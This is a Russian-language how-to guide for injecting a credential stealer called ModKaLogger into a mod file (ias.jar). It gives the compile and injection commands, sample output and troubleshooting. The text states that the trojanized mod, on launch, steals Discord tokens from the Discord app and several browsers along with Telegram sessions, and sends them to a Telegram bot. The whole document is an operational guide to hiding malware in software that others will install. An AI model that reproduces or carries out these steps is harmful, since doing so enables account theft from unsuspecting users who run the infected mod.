# Пример использования: Вшивание ModKaLogger в ias.jar

## Сценарий

У вас есть мод `ias.jar` и вы хотите вшить в него функционал ModKaLogger (кража Discord токенов и Telegram сессий).

## Решение

### Шаг 1: Подготовка

Убедитесь что у вас есть:
- ✅ `ias.jar` - целевой мод
- ✅ `ModInjector.java` - инъектор
- ✅ `src/main/java/com/modkalogger/ModKaLoggerInitThread.java` - класс-инициализатор
- ✅ `build.gradle` - с зависимостью Javassist

### Шаг 2: Компиляция ModKaLogger

```bash
# Компилируем весь проект
gradlew build -x test

# Результат: build/libs/modkalogger-1.0.0.jar
```

### Шаг 3: Скачивание Javassist

Вариант 1 - Скачать вручную:
```bash
# Скачайте с https://www.javassist.org/
# Положите javassist-3.29.2-GA.jar в корень проекта
```

Вариант 2 - Использовать Maven:
```bash
mvn dependency:copy-dependencies -DoutputDirectory=lib
# Javassist будет в lib/javassist-3.29.2-GA.jar
```

### Шаг 4: Компиляция ModInjector

```bash
# На Windows (используйте ; как разделитель)
javac -cp "build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector.java

# На Linux/Mac (используйте : как разделитель)
javac -cp "build/libs/modkalogger-1.0.0.jar:javassist-3.29.2-GA.jar" ModInjector.java
```

Результат: `ModInjector.class`

### Шаг 5: Запуск инъектора

```bash
# На Windows
java -cp ".;build/libs/modkalogger-1.0.0.jar;javassist-3.29.2-GA.jar" ModInjector ias.jar ias_injected.jar

# На Linux/Mac
java -cp ".:build/libs/modkalogger-1.0.0.jar:javassist-3.29.2-GA.jar" ModInjector ias.jar ias_injected.jar
```

Вывод:
```
============================================================
ModKaLogger Injector v2.0 (JavaAssist - Fixed)
============================================================
[*] Инициализирую ClassPool...
[*] Ищу главный класс мода...
[+] Найден главный класс: ru.ias.Main
[*] Добавляю инициализацию...
[*] Статический инициализатор не найден, создаю новый...
[+] Инициализация добавлена
[*] Сохраняю модифицированный класс...
[*] Обновляю JAR файл...
[+] JAR обновлён
[+] Вшивание завершено успешно!
[+] Результат: ias_injected.jar
============================================================
```

### Шаг 6: Проверка результата

```bash
# Запустите модифицированный мод
java -jar ias_injected.jar

# Проверьте логи на сообщения [ModKaLogger]
```

Ожидаемый вывод в логах:
```
[ModKaLogger] Инициализация начата...
[ModKaLogger] Discord функционал активирован
[ModKaLogger] Telegram функционал активирован
[ModKaLogger] Инициализация завершена
```

## Что произойдёт

При запуске `ias_injected.jar`:

1. **Загрузка мода** - JVM загружает главный класс мода
2. **Выполнение инициализации** - Статический инициализатор запускает ModKaLoggerInitThread
3. **Кража Discord токенов** - Функция `Discord.stealAndSendTokens()` крадёт токены из:
   - Discord приложения
   - Chrome
   - Edge
   - Firefox
   - Brave
   - Opera
4. **Кража Telegram сессий** - Функция `Telegram.stealAndSendSessions()` крадёт сессии
5. **Отправка на Telegram** - Украденные данные отправляются на Telegram бот

## Альтернативный способ: Python инъектор

Если у вас нет Javassist или Java компилятора:

```bash
python inject_modkalogger.py ias.jar ias_injected.jar
```

**Важно:** Python инъектор НЕ модифицирует bytecode, поэтому инициализация может не произойти автоматически.

## Проблемы и решения

### Проблема: "javassist not found"
```bash
# Убедитесь что javassist-3.29.2-GA.jar находится в текущей директории
# Или укажите полный путь в -cp
```

### Проблема: "ModKaLoggerInitThread not found"
```bash
# Убедитесь что класс скомпилирован в build/libs/modkalogger-1.0.0.jar
# Перекомпилируйте: gradlew build -x test
```

### Проблема: "Главный класс мода не найден"
```bash
# Проверьте что ias.jar содержит классы в пакете ru/
# Используйте: jar tf ias.jar | grep "\.class"
```

### Проблема: Инициализация не выполняется
```bash
# Проверьте логи на ошибки
# Убедитесь что Discord и Telegram классы находятся в ru/modkalogger/
# Проверьте что главный класс был модифицирован правильно
```

## Файлы результата

После успешного вшивания:
- ✅ `ias_injected.jar` - Модифицированный мод с вшитым ModKaLogger
- ✅ Все классы ModKaLogger находятся в `ru/modkalogger/`
- ✅ Главный класс мода модифицирован для загрузки ModKaLogger

## Проверка содержимого JAR

```bash
# Посмотрите что находится в JAR
jar tf ias_injected.jar | grep "ru/modkalogger"

# Ожидаемый результат:
# ru/modkalogger/Discord.class
# ru/modkalogger/Telegram.class
# ru/modkalogger/TelegramSender.class
# ru/modkalogger/CommandHandler.class
# ru/modkalogger/ModKaLoggerInitThread.class
```

## Заключение

Процесс вшивания:
1. Компилируем ModKaLogger
2. Компилируем ModInjector
3. Запускаем инъектор
4. Получаем `ias_injected.jar` с вшитым функционалом

Результат: Мод автоматически крадёт Discord токены и Telegram сессии при запуске.
